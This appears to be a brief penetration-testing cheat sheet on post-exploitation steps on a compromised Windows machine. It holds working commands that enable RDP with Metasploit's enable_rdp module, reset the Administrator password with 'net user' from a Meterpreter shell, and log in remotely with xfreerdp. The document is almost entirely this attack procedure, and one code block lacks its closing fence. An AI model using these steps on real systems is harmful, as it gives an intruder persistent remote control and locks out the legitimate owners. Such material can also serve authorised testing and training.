
# Enabling RDP on Windows (Post-Exploitation)

After gaining **NT AUTHORITY/SYSTEM** access:

---

## 1. Enable RDP with Metasploit
```bash
use post/windows/manage/enable_rdp
set SESSION 1
set USER Administrator       # optional
set PASSWORD password_12345  # optional
run

---

## 2. Change Password (from Meterpreter)

```bash
> shell
net user Administrator password_111112
exit
```

---

## 3. Connect via RDP

```bash
xfreerdp /v:<target_ip> /u:Administrator /p:password_111112
```

---
